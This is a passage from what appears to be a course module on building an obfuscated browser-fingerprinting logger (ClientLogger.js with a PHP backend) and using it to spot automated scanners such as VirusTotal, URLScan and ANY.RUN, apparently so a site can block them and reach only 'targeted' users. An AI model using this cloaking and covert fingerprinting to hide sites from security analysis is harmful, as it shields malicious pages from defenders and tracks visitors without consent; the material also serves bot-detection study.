window},'visualViewport':window['visualViewport']?{'width':window['visualViewport']['width'],'height':window[_0x13c6f3(0x213,'(fHK')]['height'],'offsetLeft':window['visualViewport']['offsetLeft'],'offsetTop':window[_0x4ff5ca(0x262)][_0x4ff5ca(0x264)],'scale':window[_0x4ff5ca(0x262)][_0x4ff5ca(0x284)]}:null};if(screen){_0x1d508c[_0x4ff5ca(0x281)]={'width':screen['width'],'height':screen[_0x13c6f3(0x1d0,'QwhD')],'availWidth':screen['availWidth'],'availHeight':screen[_0x4ff5ca(0x253)],'colorDepth':screen['colorDepth'],'pixelDepth':screen[_0x32fad4(0x212)],'orientation':screen[_0x4ff5ca(0x1e8)]?screen['orientation'][_0x4ff5ca(0x23e)]:_0x13c6f3(0x275,'Ym0F'),'availTop':screen[_0x13c6f3(0x271,'hmOf')]||0x0,'availLeft':screen[_0x4ff5ca(0x218)]||0x0};}if(navigator['permissions']){_0x1d508c[_0x4ff5ca(0x279)]={};const _0x3207bf=[_0x32fad4(0x1d9),_0x32fad4(0x255),'push','camera',_0x32fad4(0x21d),_0x4ff5ca(0x28b),_0x32fad4(0x270),_0x13c6f3(0x215,'@#Bt'),_0x13c6f3(0x21e,'MUXm'),_0x4ff5ca(0x257),_0x4ff5ca(0x1ca),_0x13c6f3(0x287,'eF59'),_0x4ff5ca(0x282),_0x32fad4(0x1ef)];await Promise[_0x4ff5ca(0x24e)](_0x3207bf[_0x4ff5ca(0x258)](async _0x5f2407=>{const _0x45a0c5=_0x4ff5ca;const _0x3acb6b=_0x32fad4;try{const _0x5bfb34=await navigator[_0x3acb6b(0x24b)]['query']({'name':_0x5f2407});_0x1d508c['permissions'][_0x5f2407]=_0x5bfb34[_0x3acb6b(0x293)];}catch{_0x1d508c[_0x45a0c5(0x279)][_0x5f2407]=_0x3acb6b(0x1f4);}}));}try{const _0x25602b=document['createElement'](_0x4ff5ca(0x201));const _0x1f3c29=_0x25602b[_0x32fad4(0x1d1)](_0x32fad4(0x26e))||_0x25602b[_0x32fad4(0x1d1)]('experimental-webgl');if(_0x1f3c29){_0x1d508c[_0x4ff5ca(0x1f5)]={'vendor':_0x1f3c29[_0x32fad4(0x206)](_0x1f3c29[_0x13c6f3(0x1de,'EhTh')]),'renderer':_0x1f3c29[_0x13c6f3(0x223,'Gc$)')](_0x1f3c29['RENDERER']),'extensions':_0x1f3c29[_0x4ff5ca(0x222)]()};}}catch(_0x5e708d){_0x1d508c[_0x4ff5ca(0x1f5)]={'error':_0x5e708d[_0x13c6f3(0x20f,'#E&E')]};}_0x1d508c[_0x32fad4(0x1e7)]={'localStorage':typeof localStorage!==_0x4ff5ca(0x233),'sessionStorage':typeof sessionStorage!==_0x32fad4(0x20b),'indexedDB':!!window['indexedDB']};_0x1d508c['media']={'audioFormats':{'aac':new Audio()[_0x13c6f3(0x1f1,'DuQk')](_0x4ff5ca(0x216)),'flac':new Audio()[_0x13c6f3(0x1ee,'eF59')](_0x32fad4(0x22b)),'mpeg':new Audio()['canPlayType'](_0x32fad4(0x22c)),'oggFlac':new Audio()[_0x4ff5ca(0x250)]('audio/ogg;\x20codecs=\x22flac\x22'),'oggVorbis':new Audio()[_0x32fad4(0x214)](_0x4ff5ca(0x210)),'oggOpus':new Audio()[_0x13c6f3(0x1f7,'kG50')]('audio/ogg;\x20codecs=\x22opus\x22'),'wav':new Audio()[_0x4ff5ca(0x250)](_0x13c6f3(0x23d,'ZUjV')),'webmVorbis':new Audio()[_0x4ff5ca(0x250)](_0x4ff5ca(0x241)),'webmOpus':new Audio()[_0x32fad4(0x214)](_0x32fad4(0x254)),'mp4a':new Audio()['canPlayType'](_0x4ff5ca(0x286))},'videoFormats':{'mp4Flac':document[_0x32fad4(0x268)](_0x4ff5ca(0x1d4))['canPlayType']('video/mp4;\x20codecs=\x22flac\x22'),'webmVp9Opus':document[_0x13c6f3(0x24c,'o$R[')]('video')['canPlayType'](_0x32fad4(0x266)),'webmVp8Vorbis':document[_0x4ff5ca(0x272)](_0x32fad4(0x1e2))[_0x32fad4(0x214)](_0x32fad4(0x248))}};_0x1d508c[_0x32fad4(0x251)]=[];await navigator[_0x32fad4(0x251)]['enumerateDevices']()[_0x32fad4(0x1fe)](_0x1b5e2f=>{_0x1b5e2f['forEach'](_0x39320e=>{const _0x1465ed=_0x5be2;_0x1d508c['mediaDevices']['push']({'kind':_0x39320e[_0x1465ed(0x28f)]});});});_0x1d508c[_0x32fad4(0x207)]=new Date()[_0x13c6f3(0x27c,'P&!C')]();_0x1d508c[_0x4ff5ca(0x21c)]=await this[_0x4ff5ca(0x1f3)]();_0x1d508c['evalLength']=eval['toString']()[_0x13c6f3(0x1cd,'tHbO')];_0x1d508c['botDetection']=this['detectBotVariables']();_0x1d508c[_0x4ff5ca(0x278)]=this['detectPrototypeTampering']();const _0x4794e2=this['encodeData'](_0x1d508c);this['sendData'](_0x4794e2);},'encodeData':function(_0x1a0571){const _0x2b7f5d=_0x5be2;const _0x5593d2=new TextEncoder();const _0x253a78=_0x5593d2[_0x2b7f5d(0x28a)](JSON[_0x2b7f5d(0x292)](_0x1a0571));return btoa(String['fromCharCode'](..._0x253a78));},'sendData':function(_0x45dcea){const _0x30f90f=_0x5be2;const _0x450975=_0xad88;const _0x436c9e=_0x4813;const _0x2f38ed=new XMLHttpRequest();_0x2f38ed[_0x436c9e(0x294,'SH!e')]('POST',_0x450975(0x1ed),!![]);_0x2f38ed[_0x30f90f(0x246)](_0x436c9e(0x276,'Znbh'),'application/json');_0x2f38ed['send'](JSON['stringify']({'payload':_0x45dcea}));},'detectBotVariables':function(){const _0x4cd427=_0xad88;const _0x229bae=_0x5be2;const _0x26000e=_0x4813;const _0x4ed4ee=['webdriver',_0x26000e(0x230,'XU)8'),_0x229bae(0x228),_0x4cd427(0x1e4),_0x26000e(0x283,'eF59'),_0x4cd427(0x263),_0x4cd427(0x1c9),_0x26000e(0x243,'MUXm')],_0x585dd9=['__webdriver_script_fn',_0x26000e(0x20a,'[NV8'),_0x26000e(0x27a,'LoR7'),'__selenium_evaluate','__fxdriver_evaluate',_0x4cd427(0x200),_0x26000e(0x229,'(fHK'),_0x26000e(0x265,'sWUH'),_0x4cd427(0x1e3),'__driver_unwrapped','__webdriver_unwrapped',_0x229bae(0x227),_0x26000e(0x221,'l9vG'),'__webdriver_script_func'],_0x224de9=[_0x229bae(0x25f),_0x229bae(0x26a),_0x4cd427(0x235)];const _0x50698f={'windowBotVars':{},'navigatorBotVars':{},'documentBotAttributes':{}};_0x4ed4ee['forEach'](_0x22ff16=>{_0x50698f['windowBotVars'][_0x22ff16]=_0x22ff16 in window;});_0x585dd9[_0x4cd427(0x232)](_0x392045=>{const _0x41990b=_0x229bae;_0x50698f[_0x41990b(0x1df)][_0x392045]=_0x392045 in navigator;});_0x224de9['forEach'](_0x2eb4d7=>{const _0x159c81=_0x229bae;const _0x336e45=_0x4cd427;_0x50698f[_0x336e45(0x22a)][_0x2eb4d7]=document[_0x336e45(0x236)][_0x159c81(0x1db)](_0x2eb4d7)!==null;});return _0x50698f;},'detectPrototypeTampering':function(){const _0x31c0f5=_0x5be2;const _0x24e8ef=_0xad88;const _0x16616b=_0x4813;try{if(PluginArray[_0x16616b(0x23b,'eF59')]!==navigator['plugins']['__proto__']){return{'status':_0x24e8ef(0x1ea),'reason':_0x24e8ef(0x211)};}}catch(_0xda3452){}try{if(navigator['plugins'][0x0]&&Plugin['prototype']!==navigator[_0x31c0f5(0x27f)][0x0][_0x16616b(0x1fb,'hmOf')]){return{'status':_0x24e8ef(0x1ea),'reason':'Prototype\x20tampering\x20detected\x20in\x20Plugin.'};}}catch(_0x39294c){}try{if(MimeTypeArray[_0x31c0f5(0x1fa)]!==navigator[_0x24e8ef(0x1d8)][_0x16616b(0x219,'QwhD')]){return{'status':_0x16616b(0x225,'(o0c'),'reason':'Prototype\x20tampering\x20detected\x20in\x20MimeTypeArray.'};}}catch(_0xb1ab88){}try{if(navigator[_0x16616b(0x205,'@#Bt')][0x0]&&MimeType['prototype']!==navigator[_0x31c0f5(0x28e)][0x0][_0x16616b(0x20d,'LoR7')]){return{'status':_0x16616b(0x1f6,'DuQk'),'reason':'Prototype\x20tampering\x20detected\x20in\x20MimeType.'};}}catch(_0x54fc89){}return{'status':_0x31c0f5(0x23a),'reason':_0x24e8ef(0x261)};},'checkAdBlocker':function(){const _0x445701=_0xad88;const _0x21ff19=_0x445701(0x231);return new Promise(_0x5b37be=>{const _0x458b52=_0x5be2;const _0x2a69c9=new XMLHttpRequest();_0x2a69c9[_0x458b52(0x26d)]=function(){const _0x2d3f66=_0x4813;const _0x62ee51=_0x458b52;if(_0x2a69c9['readyState']===XMLHttpRequest[_0x62ee51(0x259)]){_0x5b37be(_0x2a69c9[_0x2d3f66(0x26b,'[NV8')]===0x0||_0x2a69c9[_0x62ee51(0x1cc)]!==_0x21ff19);}};_0x2a69c9['open'](_0x458b52(0x1fc),_0x21ff19,!![]);_0x2a69c9['send'](null);});}};_0x53df61[_0xbe601c(0x27e)]=_0x2c7678;}(window));

```

## Building Server-Side Logger
The `analytics.php` file will log server-side information about the client and process the collected client-side and server-side data. The `extractServerData` function extracts the HTTP protocol, IP address and all HTTP headers.
```
function extractServerData() {
    $http_protocol = $_SERVER['SERVER_PROTOCOL'];
    $client_ip = $_SERVER['REMOTE_ADDR'];

    $http_headers = [];
    foreach ($_SERVER as $key => $value) {
        if (strpos($key, 'HTTP_') === 0) {
            $http_headers[str_replace('_', '-', substr($key, 5))] = $value;
        }
    }

    return [
        'http_protocol' => $http_protocol,
        'client_ip' => $client_ip,
        'http_headers' => $http_headers
    ];
}

```

### Processing Data
Lastly, the PHP script below retrieves the client-side data and server-side data, merges them and outputs them in JSON format inside `/var/www/clients.json`. Ensure that `clients.json` exists and permissions have been given to the web server to write to it using the commands below:
```
touch /var/www/clients.json # Create clients.json

chown www-data:www-data /var/www/clients.json # Change owner to www-data

```

```
$file_path = '/var/www/clients.json';

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (isset($data['payload'])) {
    // Decode the base64 client-side payload
    $decoded_data = json_decode(base64_decode($data['payload']), true);

    // Extract server-side data
    $server_data = extractServerData();

    // Merge the client-side and server-side data
    $decoded_data = array_merge($server_data, $decoded_data);

    $existing_data = [];
    if (file_exists($file_path)) {
        $existing_content = file_get_contents($file_path);
        $existing_data = json_decode($existing_content, true) ?: [];
    }

    $existing_data[] = $decoded_data;

    file_put_contents($file_path, json_encode($existing_data, JSON_PRETTY_PRINT));

} else {
    http_response_code(400);
}

```

### Complete Code
The code below is the entirety of the `analytics.php` file.
```
<?php
function extractServerData() {
    $http_protocol = $_SERVER['SERVER_PROTOCOL'];
    $client_ip = $_SERVER['REMOTE_ADDR'];

    $http_headers = [];
    foreach ($_SERVER as $key => $value) {
        if (strpos($key, 'HTTP_') === 0) {
            $http_headers[str_replace('_', '-', substr($key, 5))] = $value;
        }
    }

    return [
        'http_protocol' => $http_protocol,
        'client_ip' => $client_ip,
        'http_headers' => $http_headers
    ];
}

$file_path = '/var/www/clients.json';

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (isset($data['payload'])) {
    // Decode the base64 client-side payload
    $decoded_data = json_decode(base64_decode($data['payload']), true);

    // Extract server-side data
    $server_data = extractServerData();

    // Merge the client-side and server-side data
    $decoded_data = array_merge($server_data, $decoded_data);

    $existing_data = [];
    if (file_exists($file_path)) {
        $existing_content = file_get_contents($file_path);
        $existing_data = json_decode($existing_content, true) ?: [];
    }

    $existing_data[] = $decoded_data;

    file_put_contents($file_path, json_encode($existing_data, JSON_PRETTY_PRINT));

} else {
    http_response_code(400);
}
?>

```
The HTML page should include the JavaScript file or code and invoke `ClientLogger.logClientInfo()`.
```
<script src="ClientLogger.js"></script>
<script>
ClientLogger.logClientInfo();
</script>

```

## Demo
In the demonstration below, we use `geopeeker.com` to access our website, and then we verify the logged data in the `/var/www/clients.json` file.The video can be found in folder: `./videos/demo-logging-lib.mov`
## Resources

BF-F

## Objectives
Add incognito detection into the JavaScript library

Modify the server-side PHP script to retrieve additional information about the client's IP address such as ASN and include this into the logged data

Log cursor coordinates and speed and add it to the JavaScript library

Research additional useful JavaScript properties and add them to the logging library


---

# Módulo 74 — Coletando e Identificando Telemetria de Bots

Módulo 74 — Collecting & Identifying Bot Telemetry

- # Módulo 74 — Coletando e Identificando Telemetria de Bots

# Disclaimer

## Introduction
Using the logging scripts created in the Building a Client Logging Library module, we will perform a case study by logging data from scanners and bots and analyzing it to build an accurate detection algorithm.
## Prerequisite
For this module, we will need a new domain that does not have an SSL certificate yet. This is to ensure that we log all the bots and scanners that are integrated with Certificate Transparency that access our website upon issuing the certificate. Therefore, at this point you should have a domain with a DNS `A` record to a server with the following packages installed:
```
sudo apt install apache2 certbot python3-certbot-apache

sudo apt install php libapache2-mod-php

sudo systemctl restart apache2

```
Additionally ensure ports 80 and 443 are open:
```
ufw allow http

ufw allow https

```
Lastly, ensure that the `ServerName` directive is set in your Apache configuration inside the `/etc/apache2/sites-available/*.conf` file.
## Setting Up Logging Requirements
Traverse to `/var/www/html` and ensure the following files are setup prior to advancing in this module.The first file is `ClientLogger.js`, which is the logging library. Ensure `domain.com` is modified to the correct domain name in the script below. Additionally, obfuscate this file using one of the obfuscation methods discussed in the course.
```
(function(global) {
    const ClientLogger = {
        logClientInfo: async function() {
            const clientInfo = {};
            if (navigator) {
                const navigatorProperties = {
                    userAgent: navigator.userAgent,
                    appName: navigator.appName,
                    appVersion: navigator.appVersion,
                    oscpu: navigator.oscpu || 'Not Supported',
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    connection: navigator.connection ? navigator.connection.rtt : -1,
                    standalone: navigator.standalone || false,
                    userAgentData: navigator.userAgentData ? {
                      platform: navigator.userAgentData.platform || 'Unknown',
                      brands: navigator.userAgentData.brands || [],
                      mobile: navigator.userAgentData.mobile || false
                    } : 'Not supported',
                    onLine: navigator.onLine,
                    vendor: navigator.vendor,
                    product: navigator.product,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints,
                    geolocation: !!navigator.geolocation,
                    clipboardRead: !!navigator.clipboard,
                    serviceWorker: !!navigator.serviceWorker,
                    mediaDevices: !!navigator.mediaDevices,
                    buildID: navigator.buildID || 'Unknown',
                    productSub: navigator.productSub || 'Unknown',
                    vendorSub: navigator.vendorSub || 'Unknown',
                    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                    deviceMemory: navigator.deviceMemory || 'Unknown',
                    doNotTrack: navigator.doNotTrack,
                    webdriver: navigator.webdriver || false,
                    bluetooth: !!navigator.bluetooth,
                    credentials: !!navigator.credentials,
                    hid: !!navigator.hid,
                    keyboard: !!navigator.keyboard,
                    locks: !!navigator.locks,
                    mediaCapabilities: !!navigator.mediaCapabilities,
                    mediaSession: !!navigator.mediaSession,
                    permissions: !!navigator.permissions,
                    presentation: !!navigator.presentation,
                    scheduling: !!navigator.scheduling,
                    serial: !!navigator.serial,
                    storage: !!navigator.storage,
                    usb: !!navigator.usb,
                    userActivation: !!navigator.userActivation,
                    wakeLock: !!navigator.wakeLock,
                    xr: !!navigator.xr,
                    plugins: Array.from(navigator.plugins).map(plugin => ({
                        name: plugin.name,
                        description: plugin.description,
                        filename: plugin.filename
                    }))
                };
                let navCount = 0;
                for (let prop in navigator) {
                    navCount++;
                }
                clientInfo.navigator = {
                    ...navigatorProperties,
                    propertyCount: navCount
                };
            }
            clientInfo.window = {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio || 1,
                pageXOffset: window.pageXOffset || 0,
                pageYOffset: window.pageYOffset || 0,
                screenX: window.screenX || 0,
                screenY: window.screenY || 0,
                scrollX: window.scrollX || 0,
                scrollY: window.scrollY || 0,
                historyLength: window.history.length,
                performance: {
                    timeOrigin: window.performance.timeOrigin,
                    navigationStart: window.performance.timing.navigationStart,
                    domContentLoadedEventEnd: window.performance.timing.domContentLoadedEventEnd,
                    loadEventEnd: window.performance.timing.loadEventEnd
                },
                features: {
                    serviceWorker: 'serviceWorker' in navigator,
                    localStorage: 'localStorage' in window,
                    sessionStorage: 'sessionStorage' in window,
                    indexedDB: 'indexedDB' in window,
                    matchMedia: typeof window.matchMedia !== 'undefined', 
                    touchSupport: 'ontouchstart' in window
                },
                visualViewport: window.visualViewport ? {
                    width: window.visualViewport.width,
                    height: window.visualViewport.height,
                    offsetLeft: window.visualViewport.offsetLeft,
                    offsetTop: window.visualViewport.offsetTop,
                    scale: window.visualViewport.scale
                } : null
            };
            if (screen) {
                clientInfo.screen = {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation ? screen.orientation.type : 'unknown',
                    availTop: screen.availTop || 0,
                    availLeft: screen.availLeft || 0
                };
            }
            if (navigator.permissions) {
                clientInfo.permissions = {};
                const permissionsList = [
                    'geolocation',
                    'notifications',
                    'push',
                    'camera',
                    'microphone',
                    'midi',
                    'clipboard-read',
                    'clipboard-write',
                    'accelerometer',
                    'ambient-light-sensor',
                    'background-sync',
                    'magnetometer',
                    'persistent-storage',
                    'payment-handler'
                ];
                await Promise.all(
                    permissionsList.map(async (permissionName) => {
                        try {
                            const result = await navigator.permissions.query({ name: permissionName });
                            clientInfo.permissions[permissionName] = result.state;
                        } catch {
                            clientInfo.permissions[permissionName] = 'Not supported';
                        }
                    })
                );
            }
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    clientInfo.webGL = {
                        vendor: gl.getParameter(gl.VENDOR),
                        renderer: gl.getParameter(gl.RENDERER),
                        extensions: gl.getSupportedExtensions()
                    };
                }
            } catch (e) {
                clientInfo.webGL = { error: e.message };
            }
            clientInfo.storage = {
                localStorage: typeof localStorage !== 'undefined',
                sessionStorage: typeof sessionStorage !== 'undefined',
                indexedDB: !!window.indexedDB
            };

            clientInfo.media = {
                audioFormats: {
                    aac: new Audio().canPlayType('audio/aac'),
                    flac: new Audio().canPlayType('audio/flac'),
                    mpeg: new Audio().canPlayType('audio/mpeg'),
                    oggFlac: new Audio().canPlayType('audio/ogg; codecs="flac"'),
                    oggVorbis: new Audio().canPlayType('audio/ogg; codecs="vorbis"'),
                    oggOpus: new Audio().canPlayType('audio/ogg; codecs="opus"'),
                    wav: new Audio().canPlayType('audio/wav; codecs="1"'),
                    webmVorbis: new Audio().canPlayType('audio/webm; codecs="vorbis"'),
                    webmOpus: new Audio().canPlayType('audio/webm; codecs="opus"'),
                    mp4a: new Audio().canPlayType('audio/mp4; codecs="mp4a.40.2"')
                },
                videoFormats: {
                    mp4Flac: document.createElement('video').canPlayType('video/mp4; codecs="flac"'),
                    webmVp9Opus: document.createElement('video').canPlayType('video/webm; codecs="vp9, opus"'),
                    webmVp8Vorbis: document.createElement('video').canPlayType('video/webm; codecs="vp8, vorbis"')
                }
            };

            clientInfo.mediaDevices = [];
            await navigator.mediaDevices.enumerateDevices().then(devices => {
                devices.forEach(device => {
                    clientInfo.mediaDevices.push({ kind: device.kind });
                });
            });

            clientInfo.dateString = new Date().toString();

            clientInfo.adsBlocked = await this.checkAdBlocker();

            clientInfo.evalLength = eval.toString().length; // 33 in Chromium browsers, 37 in Firefox & Safari

            clientInfo.botDetection = this.detectBotVariables();

            clientInfo.prototypeTampering = this.detectPrototypeTampering();

            const encodedData = this.encodeData(clientInfo);
            this.sendData(encodedData);
        },

        encodeData: function(data) {
            const encoder = new TextEncoder();
            const encodedData = encoder.encode(JSON.stringify(data));
            return btoa(String.fromCharCode(...encodedData));
        },

        sendData: function(encodedData) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://domain.com/analytics.php', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({ payload: encodedData }));
        },

        detectBotVariables: function() {
            const windowBotVars = ['webdriver', '_Selenium_IDE_Recorder', 'callSelenium', '_selenium', 'callPhantom', '_phantom', 'phantom', '__nightmare'],
                  navigatorBotVars = ['__webdriver_script_fn', '__driver_evaluate', '__webdriver_evaluate', '__selenium_evaluate', '__fxdriver_evaluate', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_unwrapped', '__fxdriver_unwrapped', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_unwrapped', '__fxdriver_unwrapped', '__webdriver_script_func'],
                  documentBotAttributes = ['webdriver', 'selenium', 'driver'];

            const botDetectionResults = {
                windowBotVars: {},
                navigatorBotVars: {},
                documentBotAttributes: {}
            };

            windowBotVars.forEach(varName => {
                botDetectionResults.windowBotVars[varName] = varName in window;
            });

            navigatorBotVars.forEach(varName => {
                botDetectionResults.navigatorBotVars[varName] = varName in navigator;
            });

            documentBotAttributes.forEach(attr => {
                botDetectionResults.documentBotAttributes[attr] = document.documentElement.getAttribute(attr) !== null;
            });

            return botDetectionResults;
        },

        detectPrototypeTampering: function() {
            try {
                if (PluginArray.prototype !== navigator.plugins.__proto__) {
                    return {status: 'failed', reason: 'Prototype tampering detected in PluginArray.'};
                }
            } catch (e) {}
            try {
                if (navigator.plugins[0] && Plugin.prototype !== navigator.plugins[0].__proto__) {
                    return {status: 'failed', reason: 'Prototype tampering detected in Plugin.'};
                }
            } catch (e) {}
            try {
                if (MimeTypeArray.prototype !== navigator.mimeTypes.__proto__) {
                    return {status: 'failed', reason: 'Prototype tampering detected in MimeTypeArray.'};
                }
            } catch (e) {}
            try {
                if (navigator.mimeTypes[0] && MimeType.prototype !== navigator.mimeTypes[0].__proto__) {
                    return {status: 'failed', reason: 'Prototype tampering detected in MimeType.'};
                }
            } catch (e) {}

            return {status: 'passed', reason: 'No prototype tampering detected.'};
        },

        // https://dirask.com/posts/JavaScript-detect-if-adblock-is-enabled-tested-in-2024-1yR6lD
        checkAdBlocker: function() {
            const ADS_URL = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
            return new Promise(resolve => {
                const xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        resolve(xhr.status === 0 || xhr.responseURL !== ADS_URL);
                    }
                };
                xhr.open('HEAD', ADS_URL, true);
                xhr.send(null);
            });
        }

    };
    global.ClientLogger = ClientLogger;
})(window);

```
The next file is `analytics.php`, which is the server-side client logging and processing file. This file processes the data sent by `ClientLogger.js` and extracts the server-side data such as the IP address and HTTP headers.
```
<?php
function extractServerData() {
    $http_protocol = $_SERVER['SERVER_PROTOCOL'];
    $client_ip = $_SERVER['REMOTE_ADDR'];

    $http_headers = [];
    foreach ($_SERVER as $key => $value) {
        if (strpos($key, 'HTTP_') === 0) {
            $http_headers[str_replace('_', '-', substr($key, 5))] = $value;
        }
    }

    return [
        'http_protocol' => $http_protocol,
        'client_ip' => $client_ip,
        'http_headers' => $http_headers
    ];
}

$file_path = '/var/www/clients.json';

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (isset($data['payload'])) {
    // Decode the base64 client-side payload
    $decoded_data = json_decode(base64_decode($data['payload']), true);

    // Extract server-side data
    $server_data = extractServerData();

    // Merge the client-side and server-side data
    $decoded_data = array_merge($server_data, $decoded_data);

    $existing_data = [];
    if (file_exists($file_path)) {
        $existing_content = file_get_contents($file_path);
        $existing_data = json_decode($existing_content, true) ?: [];
    }

    $existing_data[] = $decoded_data;

    file_put_contents($file_path, json_encode($existing_data, JSON_PRETTY_PRINT));

} else {
    http_response_code(400);
}
?>

```
Lastly, `index.html` will be a simple file that invokes the client-side logging script.
```
<script src="ClientLogger.js"></script>
<script>
ClientLogger.logClientInfo();
</script>

```
Additionally, ensure that `/var/www/clients.json` exists with the correct permissions.
```
touch /var/www/clients.json

chown www-data:www-data /var/www/clients.json

```

## Scanning The Website
To maximize automated traffic from scanners and bots, start by requesting an SSL certificate using Certbot with the command `certbot --apache`. This process will naturally attract more automated traffic to your website. Additionally, leverage online scanning tools and automated services to increase automated visits further. Some scanning services include:
VirusTotal

- Cloudflare Radar Scan

- URLScan

- ANY.RUN

- GeoPeeker

- CriminalIP.io

Within a few hours, the number of lines in `clients.json` exceeds 6000.

## Analyzing Logs & Building Detection Techniques
In this section of the module, we will analyze the collected logs to identify bot patterns and develop detection techniques. These techniques include those introduced in previous modules, as well as new methods not covered earlier.

### IP Address
While IP blacklisting alone is insufficient to prevent automated clients due to the vast number of IP addresses they can use, analyzing information associated with the IP address can help block broader ranges of malicious IPs. Specifically, the following factors should be considered:

- Does the IP address's ASN belong to a data center?

- Is the IP address's geolocation consistent with expected patterns?

- Is the IP address generating excessive or intrusive requests?

- Is the IP address linked to known automation tools or bot activity?

### Webdriver Property
One of the simplest methods to identify if a client is using automation is by checking the `navigator.webdriver` property. This property is set to `true` when the client is operating through automated tools. Use the command below to extract the `webdriver` property.

```
jq '.[].navigator | {webdriver}' clients.json

```

### User Agent
Another simple method is analyzing the user agent, and correlate the `User-Agent` HTTP header with `navigator.userAgent` and the newer `navigator.userAgentData`. Use the command below to extract the user agent data.

```
jq '.[] | {http_user_agent: .http_headers."USER-AGENT", navigator_userAgent: .navigator.userAgent, navigator_appVersion: .navigator.appVersion, navigator_userAgentData: .navigator.userAgentData}' clients.json

```

There are several detection methods that can be implemented here:

- Checking the user agent for keywords (e.g. `google`, `bot`, `headlesschrome`, `python`).

- User agent consistency where both the HTTP header and JavaScript ones match.

- Old browser versions.

- `navigator.userAgentData` has been supported in Chromium browsers such as Chrome and Edge since version 90. Missing `navigator.userAgentData` is likely an indicator of an automated bot.

- Analyze the operating system from the `navigator.userAgentData.platform` property. Automation is favoured with Linux, therefore if the target is not Linux-based block the OS.

- Blocking mobiles using the `navigator.userAgentData.mobile` property.

- When both the HTTP and JavaScript user agents indicate a specific browser (e.g., Google Chrome, Microsoft Edge), but `navigator.userAgentData.brands` lacks corresponding browser brand entries, there may be inconsistencies that need further investigation.

For example, the client below is an automated bot via Headless Chrome:

```
{
  "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/121.0.0.0 Safari/537.36",
  "navigator_userAgent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/121.0.0.0 Safari/537.36",
  "navigator_appVersion": "5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/121.0.0.0 Safari/537.36",
  "navigator_userAgentData": {
    "platform": "Linux",
    "brands": [
      {
        "brand": "Chromium",
        "version": "121"
      },
      {
        "brand": "Not A(Brand",
        "version": "99"
      }
    ],
    "mobile": false
  }
}

```
Whereas the client below is a legitimate user using Google Chrome:

```
{
  "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "navigator_userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "navigator_appVersion": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "navigator_userAgentData": {
    "platform": "Windows",
    "brands": [
      {
        "brand": "Google Chrome",
        "version": "131"
      },
      {
        "brand": "Chromium",
        "version": "131"
      },
      {
        "brand": "Not_A Brand",
        "version": "24"
      }
    ],
    "mobile": false
  }
}

```
However, notice how `Google Chrome` is suspiciously omitted from the `brands` in the client below while the user agent is claiming to be Google Chrome.

```
{
  "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "navigator_userAgent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "navigator_appVersion": "5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "navigator_userAgentData": {
    "platform": "Linux",
    "brands": [
      {
        "brand": "Chromium",
        "version": "131"
      },
      {
        "brand": "Not_A Brand",
        "version": "24"
      }
    ],
    "mobile": false
  }
}

```

### Language
`navigator.languages` and `navigator.language` also offer an interesting opportunity for detection, specifically, these values should always be defined on modern browsers. Additionally, look for an abnormal browser language. For example, if we are targeting American users, the `navigator.language` property should be `en-US`. The command below prints `navigator.language`:

```
jq '.[].navigator | {languages}' clients.json

```
Notice in the image below one of the clients has `navigator.langauge` set to `ko-KR`.

Furthermore, look for an abnormal list of preferred languages. The command below prints `navigator.languages`:

```
jq '.[].navigator | {languages}' clients.json

```
Notice the abnormal client with a large list of preferred languages.

```
{
  "languages": [
    "en-US",
    "en",
    "ar",
    "de",
    "es",
    "hi",
    "it",
    "jp",
    "ko",
    "pt",
    "ru",
    "zh",
    "zh-CN"
  ]
}
{
  "languages": [
    "en-US",
    "en"
  ]
}
{
  "languages": [
    "en-US"
  ]
}
{
  "languages": [
    "en-US"
  ]
}
{
  "languages": [
    "en-US"
  ]
}

```

### Plugins
If the client is not a mobile device or Firefox and `navigator.plugins` is empty, then they are likely a bot. The command below prints the user agent along with the plugins:

```
jq '.[] | {"user-agent": .http_headers."USER-AGENT", plugins: .navigator.plugins}' clients.json

```

### Connection RTT
